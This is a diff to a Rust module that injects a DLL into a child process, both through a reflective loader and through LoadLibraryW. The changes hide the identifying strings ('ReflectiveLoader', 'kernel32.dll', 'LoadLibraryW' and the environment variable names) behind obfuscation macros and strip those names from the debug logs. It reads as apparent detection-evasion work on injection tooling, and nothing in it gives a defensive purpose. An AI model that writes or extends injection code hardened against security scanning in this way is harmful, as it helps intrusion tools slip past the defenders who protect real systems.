@@ -14,6 +14,7 @@ use std::sync::OnceLock;
 
 use crate::abi::{self, GetModuleFileNameW};
 use crate::dbg_log;
+use crate::{obf, obf16};
 
 static OUR_PATH: OnceLock<Vec<u16>> = OnceLock::new();
 static DLL_BYTES: OnceLock<Vec<u8>> = OnceLock::new();
@@ -51,23 +52,23 @@ fn dll_path_from_hinst(h_instance: usize) -> Vec<u16> {
 /// DLL bytes out of it. Returns None (without touching the section) when the
 /// parent did not provide it — the loadlibrary-mode disk fallback then applies.
 pub unsafe fn load_dll_bytes_from_section() -> Option<Vec<u8>> {
-    let name = crate::config::read_env(crate::config::RDI_DLL_SECTION);
-    let size_raw = crate::config::read_env(crate::config::RDI_DLL_SIZE);
+    let name = crate::config::read_env(&obf16!(b"RDI_DLL_SECTION"));
+    let size_raw = crate::config::read_env(&obf16!(b"RDI_DLL_SIZE"));
     if name.is_empty() || size_raw.is_empty() {
-        dbg_log!("section: no RDI_DLL_SECTION/RDI_DLL_SIZE env — reflective child inject disabled");
+        dbg_log!("section: no section env — reflective child inject disabled");
         return None;
     }
 
     let mut size: usize = 0;
     for &c in &size_raw {
         if !(0x30..=0x39).contains(&c) {
-            dbg_log!("section: RDI_DLL_SIZE not ASCII digits — reflective child inject disabled");
+            dbg_log!("section: size not ASCII digits — reflective child inject disabled");
             return None;
         }
         size = size.saturating_mul(10).saturating_add((c - 0x30) as usize);
     }
     if size == 0 {
-        dbg_log!("section: RDI_DLL_SIZE is 0 — reflective child inject disabled");
+        dbg_log!("section: size is 0 — reflective child inject disabled");
         return None;
     }
 
@@ -152,7 +153,8 @@ fn find_reflective_loader_offset(pe: &[u8]) -> Option<u32> {
     let funcs_off = rva_to_file_offset(funcs_rva, pe, section_off, num_sections)? as usize;
     let ordinals_off = rva_to_file_offset(ordinals_rva, pe, section_off, num_sections)? as usize;
 
-    let find_name = b"ReflectiveLoader";
+    let find_buf = obf!(b"ReflectiveLoader");
+    let find_name = &find_buf[..find_buf.len() - 1];
     for i in 0..num_names as usize {
         let name_ent = names_off + i * 4;
         if name_ent + 4 > pe.len() {
@@ -216,7 +218,7 @@ fn rva_to_file_offset(rva: u32, pe: &[u8], section_off: usize, num_sections: u16
 /// Returns false on any failure; callers treat failure as fail-open.
 pub unsafe fn inject_reflective(process: usize, bytes: &[u8]) -> bool {
     let Some(loader_offset) = find_reflective_loader_offset(bytes) else {
-        dbg_log!("inject-reflective: ReflectiveLoader export not found in DLL bytes");
+        dbg_log!("inject-reflective: loader export not found in DLL bytes");
         return false;
     };
     dbg_log!("inject-reflective: loader offset=0x{loader_offset:x} size={}", bytes.len());
@@ -288,15 +290,15 @@ pub unsafe fn inject_library(process: usize, path: &[u16]) -> bool {
         return false;
     }
 
-    let kernel32 = crate::util::wide_zstr("kernel32.dll");
+    let kernel32 = obf16!(b"kernel32.dll");
     let k32 = unsafe { abi::GetModuleHandleW(kernel32.as_ptr()) };
     if k32 == 0 {
-        dbg_log!("inject: kernel32 not loaded — abort");
+        dbg_log!("inject: system dll not loaded — abort");
         return false;
     }
-    let load_library_w = unsafe { abi::GetProcAddress(k32, c"LoadLibraryW".as_ptr().cast()) };
+    let load_library_w = unsafe { abi::GetProcAddress(k32, obf!(b"LoadLibraryW").as_ptr()) };
     if load_library_w == 0 {
-        dbg_log!("inject: LoadLibraryW not found — abort");
+        dbg_log!("inject: load-fn not found — abort");
         return false;
     }
 
